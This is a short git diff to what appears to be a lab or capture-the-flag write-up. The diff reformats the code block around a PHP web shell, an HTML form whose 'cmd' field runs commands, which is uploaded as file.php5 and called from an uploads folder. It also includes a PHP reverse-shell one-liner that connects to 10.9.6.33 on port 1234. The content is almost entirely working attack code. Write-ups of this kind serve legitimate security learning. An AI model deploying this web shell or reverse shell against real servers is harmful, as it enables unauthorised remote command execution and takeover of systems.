@@ -21,7 +21,8 @@ found:
 ## Deploy php shell
 create `file.php5`
 content:
-`<html>
+```
+<html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" id="cmd" size="80">
@@ -38,7 +39,7 @@ content:
 </body>
 <script>document.getElementById("cmd").focus();</script>
 </html>
-`
+```
 
 now call it from uploads ... you have exec
 run: `php -r '$sock=fsockopen("10.9.6.33",1234);exec("sh <&3 >&3 2>&3");'`
